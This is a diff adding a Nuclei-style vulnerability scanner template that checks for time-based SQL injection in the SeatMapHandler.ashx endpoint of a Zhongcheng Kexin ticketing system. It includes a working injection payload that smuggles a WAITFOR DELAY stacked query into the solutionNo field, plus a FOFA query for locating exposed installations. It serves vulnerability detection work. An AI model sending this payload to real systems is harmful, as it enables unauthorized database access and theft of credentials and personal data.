@@ -1,0 +1,29 @@
+id: zckx-SeatMapHandler-sqli
+info:
+  name: 中成科信票务管理系统 SeatMapHandler.ashx - sqli
+  author: leadlife
+  severity: high
+  description: 中成科信票务管理系统 SeatMapHandler.ashx 接口处存在SQL注入漏洞复现，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%B8%AD%E6%88%90%E7%A7%91%E4%BF%A1%E7%A5%A8%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E4%B8%AD%E6%88%90%E7%A7%91%E4%BF%A1%E7%A5%A8%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FSeatMapHandler.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="技术支持：北京中成科信科技发展有限公司" || icon_hash="1632964065" || icon_hash="-2142050529"
+  tags: zckx,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Method=GetZoneInfo&solutionNo=1'%3bDECLARE+%40x+CHAR(9)%3bSET+%40x%3d0x303a303a35%3bWAITFOR+DELAY+%40x--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
